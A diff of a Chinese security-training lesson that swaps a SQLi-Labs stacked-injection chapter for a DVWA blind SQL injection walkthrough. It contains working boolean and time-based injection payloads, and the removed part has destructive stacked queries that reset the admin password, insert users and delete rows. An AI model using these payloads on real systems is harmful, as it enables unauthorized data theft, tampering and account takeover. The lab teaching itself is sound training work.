@@ -1,1049 +1,833 @@
-# Day 16：SQLi-Labs高级注入Less41-55
+# Day 16：DVWA实战-SQL盲注 SQL Injection (Blind)
 
-> **🎯 靶场实战** | 难度：⭐⭐⭐ | 预计学习：80 分钟
-
----
-
-# 第16章 SQLi-Labs高级注入（Less41-55）🎯
-
-## 开篇引入：继续进阶，挑战更复杂的注入场景 🚀
-
-哈喽，各位小伙伴们！欢迎来到SQLi-Labs的高级篇章！🎉
-
-还记得前面我们学过的各种注入技巧吗？联合注入、报错注入、布尔盲注、时间盲注、堆叠注入……这些就像是我们武器库里的不同装备，每一种都有它的用武之地。
-
-如果说前面的关卡像是在练习场打固定靶，那么从这一章开始，我们就要进入"实战模拟训练场"了！🎮 这里的注入场景更加复杂，更加接近真实世界中的漏洞情况。就好比从驾校训练场开到了真实的马路上，路况更复杂，但也更刺激！
-
-在这一章里，我们会遇到：
-- **堆叠注入的各种花样**：GET型、POST型、盲注型……堆叠注入就像是给了你一把万能钥匙，能打开很多扇门🔑
-- **ORDER BY注入**：注入点不在WHERE后面，而是在ORDER BY后面，这时候常规的联合注入就失效了，怎么办？
-- **查询次数限制**：只有10次或14次查询机会！这就像是打游戏只有几条命，每一步都得精打细算🎮
-
-准备好了吗？让我们开始今天的冒险吧！💪
+> **🎯 靶场实战** | 难度：⭐⭐⭐⭐ | 预计学习：80 分钟
 
 ---
 
-## 第一部分：堆叠注入进阶（Less41-45）📚
+# 第16章 DVWA实战：SQL 盲注（SQL Injection Blind）🦇
 
-### 什么是堆叠注入？再复习一下 📖
+哈喽各位小伙伴们大家好！👋 欢迎来到第16章！
 
-在开始新关卡之前，我们先快速复习一下"堆叠注入"这个老朋友。
+在上一章 Day15 里，我们把"前端的把戏"玩了个遍——改变量、解密前端算法、偷 Token、重放多步流程，是不是感觉自己已经变成"前端老狐狸"了？😏 今天这一章，我们要回到 SQL 注入，专门攻克 Day10 学 SQL 注入时"提了一嘴但没展开"的终极形态——**SQL 盲注（Blind SQL Injection）**。
 
-堆叠注入，说白了就是**一次执行多条SQL语句**，就像是你去便利店买东西，一次说了好几个需求："给我拿瓶可乐，再拿包薯片，再来个棒棒糖🍭"。正常情况下，SQL一次只能执行一条语句，但如果使用分号`;`把多条语句隔开，有些数据库（比如MySQL）就会一条一条依次执行。
+还记得 Day10 我们学 SQL 注入时，页面会**直接把 SQL 查询结果、报错信息、甚至是 Union 出来的表数据**直接显示在网页上吗？那种叫"**显注（In-band SQLi）**"，相当于坏人直接跟数据库"面对面聊天"，数据库有啥都说。但现实世界里的网站，90% 都**不会把数据库的查询结果直接显示给你**——
 
-打个生活中的比方：
-- 普通SQL注入就像是你在餐厅点餐，只能点一道菜🍚
-- 堆叠注入就像是你可以一次点一桌子菜！🍱🍲🍜
+> 你提交了一个带 SQL 的请求，页面只会给你两种结果：
+> - 😊 **"查询成功！用户存在"**（我们叫它 True / 真）
+> - 😭 **"查询失败，用户不存在 / 页面 404"**（我们叫它 False / 假）
+>
+> 没有报错、没有 Union 回显、什么信息都看不见——**就像你跟一个蒙着面的人说话，他只会点头（真）或摇头（假），不会说别的**。
 
-堆叠注入能做什么呢？那可多了去了：
-- **增删改查样样行**：不仅能查询数据，还能新增、修改、删除数据
-- **操作数据库结构**：创建表、删除表、修改表结构
-- **文件操作**：在某些情况下还能读写文件
-- **提权操作**：甚至可以创建数据库用户、提升权限
+这就是**盲注（Blind Injection）** 这个名字的由来：**数据库的回显对你来说是"瞎的、看不见的"，你只能通过页面的"真/假反馈"来一点一点"猜"出数据库里的每一个字符。** 听起来是不是特别有意思？就像玩"猜数字"游戏——
 
-是不是很强大？但要注意，堆叠注入也有它的限制，比如PHP的`mysql_query()`函数就不支持多语句执行，而`mysqli_multi_query()`才支持。所以能否使用堆叠注入，还得看后端代码怎么写的。
+```
+我（攻击者）：数据库里的第一个字符，ASCII 码是不是大于 100？😈
+蒙面人（页面）：✅ 点头（True）
+我：ASCII 码是不是大于 110？
+蒙面人：❌ 摇头（False）
+我：哦！那第一个字符的 ASCII 就在 101~110 之间！🔍
+（二分查找，最多再问 3 次就能确定是 'e'）
+我：那它是不是大于 104？
+蒙面人：✅ 点头
+我：是不是大于 106？
+蒙面人：❌ 摇头
+我：是不是大于 105？
+蒙面人：❌ 摇头 → 哦！就是 105！ASCII=105 的字符是 'i'！🎉
+```
 
-好，复习完毕，让我们开始闯关！🎮
+今天这一章，我们就用这个"20 个问题游戏"的思路，在 DVWA 的 SQL Injection (Blind) 模块里，**四个级别（Low/Med/High/Impossible）逐个击穿**，而且分两种打法：
+- **打法① 布尔盲注（Boolean-based）**：靠页面 True/False 区分
+- **打法② 时间盲注（Time-based）**：页面连 True/False 都不给，完全一样！这时候我们靠 `sleep(3)` 让页面延迟 3 秒才返回，从**响应时间的长短**判断真假（更狠！）
+
+每一级别依然是：大白话比喻 → 分步实操 → 逐行源码解析 → 修复建议。盲注是 SQL 注入里最考验耐心、也最能体现"安全思维"的部分，也是 CISP-PTE、CTF、护网里的必考题型——**今天把它啃透了，后面的 SQLi-Labs 你就是躺着过！** 坐稳扶好，我们出发！🚀
 
 ---
 
-### Less-41：GET - 数字型 - 堆叠注入 - 盲注 🎯
+## 16.1 前置知识：显注 vs 盲注，一眼看出区别 👀
 
-**关卡特点**：数字型注入、支持堆叠注入、盲注（没有错误回显）
+### 16.1.1 生活比喻："话痨客服" vs "高冷客服" vs "哑巴客服"
 
-#### 第一步：判断注入点和类型 🔍
-
-打开Less-41，我们看到URL里有个`id`参数：
-```
-http://127.0.0.1/sqli-labs/Less-41/?id=1
-```
-
-老规矩，先试试加个单引号：
-```
-?id=1'
-```
-哎？页面居然和正常一样！这说明什么？说明这是**数字型注入**，单引号不会影响SQL语句的结构。
-
-再试试数字运算：
-```
-?id=1 and 1=1  -- 正常显示
-?id=1 and 1=2  -- 不正常（但因为是盲注，可能只是不显示数据）
-```
-
-因为是盲注，我们看不到明显的错误信息，但通过页面是否显示数据，我们可以判断注入是否存在。
-
-#### 第二步：试试堆叠注入 🔧
-
-既然是数字型，我们直接在后面加分号，然后跟上第二条语句试试：
+我们把 Web 应用想象成一个银行客服热线，你（攻击者）打电话过去查账户信息：
 
 ```
-?id=1; select 1,2,3 --
+📞 客服类型 ①：话痨客服（= 显注 Union/Error-based）
+你：帮我查一下账号 1 的余额
+客服：好的，账号1 用户名 admin 余额 9999元 身份证 110101...
+    （吧啦吧啦把所有信息全念给你听，Union 和报错信息也念）
+→ 你一次电话就拿到全部信息 = Day10 学的显注，最爽的情况！
+
+📞 客服类型 ②：高冷客服（= 布尔盲注 Boolean-based）
+你：帮我查一下账号 1 的余额是不是 > 1000？
+客服：【嗯】（只说一个字 = 对/点头，页面显示 MISSING / EXISTS）
+你：那是不是 > 5000？
+客服：【不是】（只说一个字 = 不对/摇头，页面显示 User ID is MISSING）
+→ 你得一个问题一个问题地问，靠 Yes/No 慢慢拼出信息 = 布尔盲注
+
+📞 客服类型 ③：哑巴客服（= 时间盲注 Time-based）
+你：帮我查一下账号 1 的余额是不是 > 1000？
+客服：（……沉默了 3 秒钟）          （表示"是"，因为你说"如果是就沉默3秒再挂"）
+你：那是不是 > 5000？
+客服：（瞬间就挂了，等都不等）    （表示"不是"）
+→ 他连 Yes/No 都不说，你只能通过"沉默的时间长短"来判断 = 时间盲注
 ```
 
-等等，怎么确认堆叠注入是否成功呢？因为这是盲注，没有回显，我们得想个办法验证。
+**划重点！⭐** 现实世界中 90% 的真实 SQL 注入场景，都是**类型 ② 或 ③**——因为网站开发者学聪明了，"我不把数据库内容显示给你看，不报错，你总没法注入了吧？"——结果反而催生了盲注这种"你不说我也能猜到"的终极技巧。😎
 
-有了！我们可以用时间盲注的思路来验证：
+下面这张 SVG 对比图帮你把三种注入的区别刻进脑子里👇
+
+<svg width="100%" viewBox="0 0 900 540" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
+  <defs>
+    <linearGradient id="g16a" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0%" stop-color="#eff6ff"/>
+      <stop offset="100%" stop-color="#dbeafe"/>
+    </linearGradient>
+  </defs>
+  <rect x="0" y="0" width="900" height="540" rx="16" fill="url(#g16a)" stroke="#2563eb" stroke-width="2.5"/>
+  <text x="450" y="45" text-anchor="middle" font-family="Microsoft YaHei" font-size="22" fill="#1e3a8a" font-weight="bold">🔍 三种 SQL 注入场景对比（显注 / 布尔盲注 / 时间盲注）</text>
+  <!-- 列1 显注 -->
+  <g transform="translate(30, 85)">
+    <rect x="0" y="0" width="270" height="420" rx="14" fill="white" stroke="#16a34a" stroke-width="2.5"/>
+    <rect x="0" y="0" width="270" height="50" rx="14" fill="#16a34a"/>
+    <rect x="0" y="38" width="270" height="12" fill="#16a34a"/>
+    <text x="135" y="33" text-anchor="middle" font-family="Microsoft YaHei" font-size="18" font-weight="bold" fill="white">① 显注（In-band）</text>
+    <text x="135" y="78" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#166534">最爽！最罕见！面试常考</text>
+    <rect x="20" y="100" width="230" height="140" rx="10" fill="#0f172a" stroke="#1e293b"/>
+    <text x="35" y="128" font-family="Consolas" font-size="12" fill="#fbbf24">// 输入 1' UNION SELECT 1,version(),database() --</text>
+    <text x="35" y="152" font-family="Consolas" font-size="13" fill="#e2e8f0">👉 HTTP 200 OK 页面直接显示：</text>
+    <rect x="35" y="162" width="200" height="65" rx="6" fill="#1e293b" stroke="#4ade80"/>
+    <text x="135" y="186" text-anchor="middle" font-family="Consolas" font-size="13" fill="#4ade80" font-weight="bold">5.7.26-log</text>
+    <text x="135" y="212" text-anchor="middle" font-family="Consolas" font-size="13" fill="#34d399">dvwa</text>
+    <text x="30" y="270" font-family="Microsoft YaHei" font-size="14" fill="#0f172a" font-weight="bold">✅ 回显特征：</text>
+    <text x="30" y="295" font-family="Microsoft YaHei" font-size="13" fill="#065f46">• 页面直接显示 SQL 查询结果</text>
+    <text x="30" y="318" font-family="Microsoft YaHei" font-size="13" fill="#065f46">• MySQL 报错信息直接打印</text>
+    <text x="30" y="341" font-family="Microsoft YaHei" font-size="13" fill="#065f46">• UNION 查询结果直接渲染</text>
+    <rect x="20" y="358" width="230" height="45" rx="8" fill="#dcfce7" stroke="#16a34a"/>
+    <text x="135" y="385" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#166534" font-weight="bold">获取 1 条数据 = 1 次请求 ⚡</text>
+  </g>
+  <!-- 列2 布尔盲注 -->
+  <g transform="translate(315, 85)">
+    <rect x="0" y="0" width="270" height="420" rx="14" fill="white" stroke="#f59e0b" stroke-width="2.5"/>
+    <rect x="0" y="0" width="270" height="50" rx="14" fill="#f59e0b"/>
+    <rect x="0" y="38" width="270" height="12" fill="#f59e0b"/>
+    <text x="135" y="33" text-anchor="middle" font-family="Microsoft YaHei" font-size="18" font-weight="bold" fill="white">② 布尔盲注（Boolean）</text>
+    <text x="135" y="78" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#92400e">真实世界最常见！Yes/No 猜</text>
+    <rect x="20" y="100" width="230" height="140" rx="10" fill="#0f172a" stroke="#1e293b"/>
+    <text x="35" y="128" font-family="Consolas" font-size="12" fill="#fbbf24">// 输入 1' AND ASCII(SUBSTRING(user(),1,1))>100 --</text>
+    <text x="35" y="156" font-family="Consolas" font-size="13" fill="#16a34a">👉 True 时页面显示：</text>
+    <text x="60" y="176" font-family="Microsoft YaHei" font-size="13" fill="#16a34a" font-weight="bold">✔ User ID exists in DB.</text>
+    <text x="35" y="206" font-family="Consolas" font-size="13" fill="#dc2626">👉 False 时页面显示：</text>
+    <text x="60" y="226" font-family="Microsoft YaHei" font-size="13" fill="#dc2626" font-weight="bold">✘ User ID is MISSING.</text>
+    <text x="30" y="270" font-family="Microsoft YaHei" font-size="14" fill="#0f172a" font-weight="bold">✅ 回显特征：</text>
+    <text x="30" y="295" font-family="Microsoft YaHei" font-size="13" fill="#92400e">• 只有两种稳定页面状态</text>
+    <text x="30" y="318" font-family="Microsoft YaHei" font-size="13" fill="#92400e">• 不显示具体 SQL 数据/报错</text>
+    <text x="30" y="341" font-family="Microsoft YaHei" font-size="13" fill="#92400e">• 用二分查找猜每个字符</text>
+    <rect x="20" y="358" width="230" height="45" rx="8" fill="#fef3c7" stroke="#d97706"/>
+    <text x="135" y="385" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#92400e" font-weight="bold">获取 1 个字符 = 约 7 次请求 🐢</text>
+  </g>
+  <!-- 列3 时间盲注 -->
+  <g transform="translate(600, 85)">
+    <rect x="0" y="0" width="270" height="420" rx="14" fill="white" stroke="#dc2626" stroke-width="2.5"/>
+    <rect x="0" y="0" width="270" height="50" rx="14" fill="#dc2626"/>
+    <rect x="0" y="38" width="270" height="12" fill="#dc2626"/>
+    <text x="135" y="33" text-anchor="middle" font-family="Microsoft YaHei" font-size="18" font-weight="bold" fill="white">③ 时间盲注（Time-based）</text>
+    <text x="135" y="78" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d">终极武器！啥页面都能打</text>
+    <rect x="20" y="100" width="230" height="140" rx="10" fill="#0f172a" stroke="#1e293b"/>
+    <text x="35" y="128" font-family="Consolas" font-size="12" fill="#fbbf24">// 输入 1' AND IF(SUBSTRING(user(),1,1)='a',SLEEP(3),0) --</text>
+    <text x="35" y="158" font-family="Consolas" font-size="13" fill="#16a34a">👉 True 时：响应时间 = 3200 ms</text>
+    <g transform="translate(60, 168)">
+      <rect x="0" y="0" width="150" height="10" rx="5" fill="#334155"/>
+      <rect x="0" y="0" width="140" height="10" rx="5" fill="#f97316"/>
+      <text x="75" y="25" text-anchor="middle" font-family="Consolas" font-size="10" fill="#fb923c">██████████░░ 3.2s</text>
+    </g>
+    <text x="35" y="218" font-family="Consolas" font-size="13" fill="#dc2626">👉 False 时：响应时间 = 45 ms</text>
+    <g transform="translate(60, 228)">
+      <rect x="0" y="0" width="150" height="10" rx="5" fill="#334155"/>
+      <rect x="0" y="0" width="3" height="10" rx="5" fill="#22c55e"/>
+      <text x="75" y="25" text-anchor="middle" font-family="Consolas" font-size="10" fill="#22c55e">█░░░░░░░░░░░ 0.045s</text>
+    </g>
+    <text x="30" y="270" font-family="Microsoft YaHei" font-size="14" fill="#0f172a" font-weight="bold">✅ 回显特征：</text>
+    <text x="30" y="295" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d">• True / False 页面完全一样！</text>
+    <text x="30" y="318" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d">• 只能通过响应时间差判断</text>
+    <text x="30" y="341" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d">• SLEEP() / BENCHMARK() 做延迟</text>
+    <rect x="20" y="358" width="230" height="45" rx="8" fill="#fee2e2" stroke="#dc2626"/>
+    <text x="135" y="385" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#7f1d1d" font-weight="bold">获取 1 个字符 = 约 7×3 秒 🐌</text>
+  </g>
+</svg>
+
+### 16.1.2 盲注必备的 5 个 SQL 函数（必须背下来！）
+
+这 5 个函数是盲注的"十八般兵器"，今天每一个都会被我们用到滚瓜烂熟👇
+
+| 函数 | MySQL 语法 | 大白话作用 | 盲注里我们怎么用？ |
+|---|---|---|---|
+| **① SUBSTRING() / MID()** | `SUBSTRING(字符串, 起始位置, 长度)` | 把字符串里的"第 N 个字符"抠出来，比如 `SUBSTRING("admin",1,1)='a'` | 逐个字符猜，比如猜数据库名第 1 个字符、第 2 个字符 |
+| **② ASCII()** | `ASCII(单个字符)` | 把字符转成 0~127 的 ASCII 数字，比如 `ASCII('a')=97` | 配合二分查找，不用枚举 95 个可见字符，7 次就猜中 |
+| **③ LENGTH()** | `LENGTH(字符串)` | 返回字符串长度，比如 `LENGTH(DATABASE())=4` 就是 'dvwa' | 先猜"目标字符串总长度"，知道要猜几轮就停 |
+| **④ SLEEP(N)** | `SLEEP(3)` | 让 SQL 线程"睡 3 秒"再返回结果（MySQL 独有，PostgreSQL 用 pg_sleep） | 时间盲注的灵魂！True 就睡 3 秒，False 不睡，靠响应时间判断 |
+| **⑤ IF(expr, A, B)** | `IF(1=1,'对','错')` | 三目运算符，expr 为真返回 A，为假返回 B | 配合 SLEEP 用：`IF(条件, SLEEP(3), 0)` → 条件真才延迟 |
+
+**记忆口诀：** 🎵 长度用 LENGTH，逐个抠 SUBSTRING，转数字 ASCII，等时间 SLEEP，二选一 IF。🎵
+
+### 16.1.3 盲注的标准 4 步流程（今天全章反复用这个套路）
+
+不管是布尔盲注还是时间盲注，**不管目标是数据库名/表名/列名/数据**，我们都按这 4 步走：
+
 ```
-?id=1; select sleep(5) --
+Step 1：测"注入点能不能闭合" + 测"True / False 两个页面长什么样"
+         （布尔盲注看 HTML 差异，时间盲注看 SLEEP 有没有生效）
+Step 2：猜 LENGTH(目标字符串) 有多长
+         （比如数据库名长度是 4，那就只要猜 4 轮）
+Step 3：逐个字符猜，第 i 个字符是什么（用 SUBSTRING + 二分查找）
+Step 4：把猜到的字符一个个拼起来，就是完整的答案！
+         （比如第1个='d'，第2个='v'，第3个='w'，第4个='a' → dvwa 🎉）
 ```
 
-如果页面延迟了5秒才加载出来，那就说明堆叠注入成功了！我们的第二条语句被执行了！⏰
-
-#### 第三步：堆叠注入能做什么？🛠️
-
-既然堆叠注入能用，那我们能做的事情就多了去了！
-
-**示例1：创建一个新表**
-```
-?id=1; create table test_table (id int, name varchar(100)) --
-```
-这就像是在数据库里新建了一个文件夹📁
-
-**示例2：往表里插入数据**
-```
-?id=1; insert into test_table values(1, 'helloworld') --
-```
-这就像是往文件夹里放了一个文件📄
-
-**示例3：修改数据**
-```
-?id=1; update users set password='hacked' where id=1 --
-```
-这就像是修改了别人文件里的内容✏️
-
-**示例4：删除数据**
-```
-?id=1; delete from users where id=3 --
-```
-这就像是删除了别人的文件🗑️
-
-是不是很强大？堆叠注入就像是给了你完全控制数据库的权限！只要你能想到的SQL语句，几乎都能执行！
-
-> **💡 小贴士**：堆叠注入虽然强大，但也不是万能的。比如在有些场景下，即使支持堆叠注入，第二条语句的执行结果也不会返回到页面上，所以我们还得配合盲注或者其他方式来获取数据。
+好，理论说完！🔥 下面我们进入 DVWA **SQL Injection (Blind)** 模块，从 Low 级别开干！
 
 ---
 
-### Less-42：POST - 单引号 - 堆叠注入 - 错误回显 🎯
+## 16.2 正式闯关：Low 级别 —— 毫无防护的"裸奔"盲注
 
-**关卡特点**：POST型注入、登录框场景、密码字段有注入、单引号闭合、有错误回显
+### 16.2.1 正常玩家视角：页面长啥样？👀
 
-#### 第一步：观察场景 🔍
+登录 DVWA → 左侧把 **DVWA Security** 改成 **low** → 左侧点 **SQL Injection (Blind)** 菜单。
 
-打开Less-42，哇！这是一个登录框！👤
-- 有用户名输入框
-- 有密码输入框
-- 有登录按钮
+你会看到一个输入框写着"**User ID**"，旁边一个 Submit 按钮：
+- 输入 `1` → 页面显示：**User ID exists in the database.**（绿色提示，说明这是 True 页面）
+- 输入 `9999`（不存在的 ID）→ 页面显示：**User ID is MISSING from the database.**（红色提示，说明这是 False 页面）
 
-这场景是不是很熟悉？很多网站的登录页面都长这样！
+**完美！！⭐** 这就是标准的"高冷客服"——只有 True/False 两种反馈。盲注条件满足！！
 
-#### 第二步：寻找注入点 🎯
+### 16.2.2 布尔盲注打法①：先闭合注入点，再确认 True/False
 
-一般来说，登录框的注入点可能在用户名，也可能在密码，或者两个都有。
-
-我们先试试用户名：
-- 用户名输入：`admin'`
-- 密码随便输：`123`
-
-点登录，看看结果……嗯，好像没什么特别的报错？那试试密码字段呢？
-
-- 用户名随便输：`test`
-- 密码输入：`123'`
-
-点登录！哎？报错了！🤩
+先测一下这个注入点是**数字型还是字符型**？（Day10 学过的判断方法）
 
 ```
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '123'' at line 1
+输入 1 AND 1=1  → 点 Submit → 页面显示【User ID exists】(True) ✅
+输入 1 AND 1=2  → 点 Submit → 页面显示【User ID exists】(还是 True？不对...)
 ```
 
-太好了！**注入点在密码字段**！而且是单引号闭合的！
+哦？`AND 1=2` 逻辑结果是 False，但页面还是 True——说明这不是"数字型"，而是**字符型注入**！（外面有引号包裹）那我们尝试用 `'` 闭合它：
 
-#### 第三步：分析SQL语句结构 📐
-
-根据报错信息，我们可以推测后端的SQL大概长这样：
-```sql
-SELECT * FROM users WHERE username='$username' and password='$password'
+```
+输入 1' AND '1'='1  → 点 Submit → 【User ID exists】(True) ✅
+输入 1' AND '1'='2  → 点 Submit → 【User ID MISSING】(False) ✅ 成功！
 ```
 
-当我们在密码框输入 `123'` 时，SQL就变成了：
-```sql
-SELECT * FROM users WHERE username='test' and password='123''
+**也可以用注释符 `-- ` 闭合**（注意减号减号后面有个空格！）：
+
 ```
-多了一个单引号，所以报错了！
-
-#### 第四步：试试堆叠注入 🔧
-
-既然有错误回显，我们可以先试试堆叠注入能不能用。
-
-在密码框输入：
-```
-123'; create table test42 like users --
-```
-用户名随便输一个，比如 `test`
-
-点击登录，如果没有报错，说明堆叠注入可能成功了！
-
-我们再验证一下，输入：
-```
-123'; drop table test42 --
-```
-如果也没报错，那就板上钉钉了，堆叠注入可用！✅
-
-#### 第五步：堆叠注入实战 - 改密码 🔐
-
-堆叠注入最实用的操作之一就是**改密码**！试想一下，如果你发现了一个登录框的堆叠注入，你不需要知道管理员的密码，直接就能改掉！
-
-在密码框输入：
-```
-123'; update users set password='newpass' where username='admin' --
-```
-用户名随便输。
-
-执行完之后，你就可以用 `admin / newpass` 来登录了！是不是很厉害？😎
-
-这就好比你去别人家，不用撬锁，直接把门牌号给换了，然后用新钥匙开门🔑
-
-#### 第六步：堆叠注入实战 - 添加用户 👤
-
-除了改密码，我们还可以直接添加一个管理员用户！
-
-在密码框输入：
-```
-123'; insert into users (id, username, password) values (99, 'hacker', '123456') --
+输入 1' AND 1=1 --  → True ✅
+输入 1' AND 1=2 --  → False ✅ 完美闭合！
 ```
 
-执行完之后，你就可以用 `hacker / 123456` 来登录了！自己造一个账号，想怎么用就怎么用！🎉
+下面这张 SVG 演示了闭合成功后 True/False 两个条件是怎么被后端执行的👇
 
-> **💡 生活小比喻**：这就像是你去一个需要门禁卡的大楼，你不用偷别人的卡，直接去物业给自己办了一张新卡！而且还是最高权限的那种！🏢
+<svg width="100%" viewBox="0 0 900 380" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
+  <rect x="0" y="0" width="900" height="380" rx="14" fill="#f0fdf4" stroke="#16a34a" stroke-width="2"/>
+  <text x="450" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="20" fill="#166534" font-weight="bold">Step 1：闭合注入点 + 确认 True / False 两种页面</text>
+  <!-- True 路径 -->
+  <g transform="translate(40,80)">
+    <rect x="0" y="0" width="400" height="260" rx="12" fill="white" stroke="#16a34a" stroke-width="2"/>
+    <rect x="0" y="0" width="400" height="45" rx="12" fill="#16a34a"/>
+    <rect x="0" y="32" width="400" height="13" fill="#16a34a"/>
+    <text x="200" y="30" text-anchor="middle" font-family="Microsoft YaHei" font-size="17" font-weight="bold" fill="white">✅ AND 1=1 --  (逻辑真)</text>
+    <text x="20" y="80" font-family="Microsoft YaHei" font-size="14" fill="#166534" font-weight="bold">后端拼接出的 SQL：</text>
+    <rect x="20" y="95" width="360" height="48" rx="8" fill="#0f172a"/>
+    <text x="30" y="125" font-family="Consolas" font-size="13" fill="#fbbf24">SELECT first_name, last_name</text>
+    <text x="30" y="142" font-family="Consolas" font-size="13" fill="#86efac">FROM users WHERE user_id = '1' AND 1=1 --';</text>
+    <g transform="translate(20,165)">
+      <text x="0" y="0" font-family="Microsoft YaHei" font-size="13" fill="#0f172a" font-weight="bold">MySQL 执行结果：</text>
+      <rect x="0" y="12" width="360" height="32" rx="6" fill="#dcfce7" stroke="#16a34a"/>
+      <text x="180" y="33" text-anchor="middle" font-family="Consolas" font-size="13" fill="#15803d" font-weight="bold">WHERE 条件 = TRUE, 查询到了 admin 的记录</text>
+    </g>
+    <g transform="translate(20,220)">
+      <text x="0" y="0" font-family="Microsoft YaHei" font-size="13" fill="#0f172a" font-weight="bold">👉 页面回显：</text>
+      <rect x="0" y="12" width="360" height="28" rx="6" fill="#bbf7d0" stroke="#16a34a" stroke-width="2"/>
+      <text x="180" y="31" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#14532d" font-weight="bold">✔ User ID exists in the database.</text>
+    </g>
+  </g>
+  <!-- False 路径 -->
+  <g transform="translate(460,80)">
+    <rect x="0" y="0" width="400" height="260" rx="12" fill="white" stroke="#dc2626" stroke-width="2"/>
+    <rect x="0" y="0" width="400" height="45" rx="12" fill="#dc2626"/>
+    <rect x="0" y="32" width="400" height="13" fill="#dc2626"/>
+    <text x="200" y="30" text-anchor="middle" font-family="Microsoft YaHei" font-size="17" font-weight="bold" fill="white">❌ AND 1=2 --  (逻辑假)</text>
+    <text x="20" y="80" font-family="Microsoft YaHei" font-size="14" fill="#7f1d1d" font-weight="bold">后端拼接出的 SQL：</text>
+    <rect x="20" y="95" width="360" height="48" rx="8" fill="#0f172a"/>
+    <text x="30" y="125" font-family="Consolas" font-size="13" fill="#fbbf24">SELECT first_name, last_name</text>
+    <text x="30" y="142" font-family="Consolas" font-size="13" fill="#fca5a5">FROM users WHERE user_id = '1' AND 1=2 --';</text>
+    <g transform="translate(20,165)">
+      <text x="0" y="0" font-family="Microsoft YaHei" font-size="13" fill="#0f172a" font-weight="bold">MySQL 执行结果：</text>
+      <rect x="0" y="12" width="360" height="32" rx="6" fill="#fee2e2" stroke="#dc2626"/>
+      <text x="180" y="33" text-anchor="middle" font-family="Consolas" font-size="13" fill="#b91c1c" font-weight="bold">WHERE 条件 = FALSE, 查询结果为空</text>
+    </g>
+    <g transform="translate(20,220)">
+      <text x="0" y="0" font-family="Microsoft YaHei" font-size="13" fill="#0f172a" font-weight="bold">👉 页面回显：</text>
+      <rect x="0" y="12" width="360" height="28" rx="6" fill="#fecaca" stroke="#dc2626" stroke-width="2"/>
+      <text x="180" y="31" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#450a0a" font-weight="bold">✘ User ID is MISSING from the database.</text>
+    </g>
+  </g>
+</svg>
 
----
+### 16.2.3 布尔盲注 Step 2：先猜 DATABASE() 有多长？
 
-### Less-43：POST - 单引号+括号 - 堆叠注入 - 错误回显 🎯
+目标：先搞清楚当前数据库（DATABASE()）的名字有几个字符？我们知道答案是 'dvwa' = 4 个字符，但假装不知道，一步步猜：
 
-**关卡特点**：和Less-42类似，只不过是单引号+括号闭合
-
-#### 快速通关攻略 ⚡
-
-Less-43和Less-42几乎一模一样，都是登录框，都是密码字段注入，都有错误回显。唯一的区别就是**闭合方式不同**。
-
-在Less-42里，我们用单引号就能闭合；但在Less-43里，我们需要用 `')` 来闭合。
-
-为什么呢？因为后端的SQL可能长这样：
-```sql
-SELECT * FROM users WHERE username=('$username') and password=('$password')
 ```
-看到了吗？多了一对括号！就像是给值穿了件外套🧥
-
-所以我们的Payload也要相应调整：
-
-**判断注入点**：
-```
-密码输入：123') --
-```
-如果不报错且登录失败（因为用户名不对），说明闭合成功了。
-
-**堆叠注入改密码**：
-```
-123'); update users set password='hacked' where username='admin' --
-```
-
-**添加用户**：
-```
-123'); insert into users values (88, 'myuser', 'mypass') --
-```
-
-看到没有？思路完全一样，就是闭合方式变了一下！这就像是换了一把不同的锁，但开门的方法还是一样的🔐
-
-> **🧠 新手小贴士**：遇到类似的关卡，不要慌！先回忆一下之前学过的方法，然后重点测试闭合方式。只要闭合方式找对了，后面的操作都是套路！
-
----
-
-### Less-44：POST - 单引号 - 堆叠注入 - 盲注 🎯
-
-**关卡特点**：POST型、单引号闭合、堆叠注入、盲注（没有错误回显）
-
-#### 关卡分析 📊
-
-Less-44和Less-42的场景一样，都是登录框。但是！Less-44是**盲注**，也就是说：
-- 输对了 → 登录成功
-- 输错了 → 登录失败
-- 即使SQL语句写错了 → 也只是登录失败，不会报错
-
-这就麻烦了！没有错误信息，我们怎么判断注入点？怎么判断闭合方式？
-
-别担心，方法总比困难多！💪
-
-#### 第一步：判断注入点和闭合方式 🔍
-
-虽然没有错误回显，但我们可以用**布尔盲注**的思路来判断。
-
-**测试密码字段的单引号闭合：**
-- 用户名：`test`
-- 密码：`123' or '1'='1`
-
-如果这样能登录成功（或者说页面显示和正常登录成功一样），说明单引号闭合成功了！
-
-为什么呢？因为SQL变成了：
-```sql
-SELECT * FROM users WHERE username='test' and password='123' or '1'='1'
-```
-`'1'='1'` 永远成立，所以查询能查到数据，就登录成功了！
-
-#### 第二步：验证堆叠注入 🔧
-
-因为是盲注，我们不能通过报错来判断堆叠注入是否成功。那怎么办呢？
-
-用**时间盲注**！⏰
-
-在密码框输入：
-```
-123'; select sleep(5) --
+输入 1' AND LENGTH(DATABASE()) > 10 --  → False ❌ (长度 ≤ 10)
+输入 1' AND LENGTH(DATABASE()) >  5 --  → False ❌ (长度 ≤ 5)
+输入 1' AND LENGTH(DATABASE()) >  3 --  → True  ✅ (长度 > 3 且 ≤ 5 → 要么 4 要么 5)
+输入 1' AND LENGTH(DATABASE()) =  4 --  → True  ✅ 🎉 猜到了！DATABASE() 长度 = 4！
 ```
 
-如果页面延迟了5秒才返回，说明堆叠注入成功了！第二条语句 `select sleep(5)` 被执行了！
+**二分查找思路：** 猜 4 次就出结果，比从 1 开始一个个试（最多试 4 次也 OK，但长字符串（比如表名 15+ 字符）二分法差距就拉开了）。
 
-这就像是你在门外喊一声，然后等里面的回应。如果过了5秒才有动静，说明里面有人听到了！📣
+### 16.2.4 布尔盲注 Step 3：逐个字符猜 DATABASE() 的 4 个字母
 
-#### 第三步：利用堆叠注入 🛠️
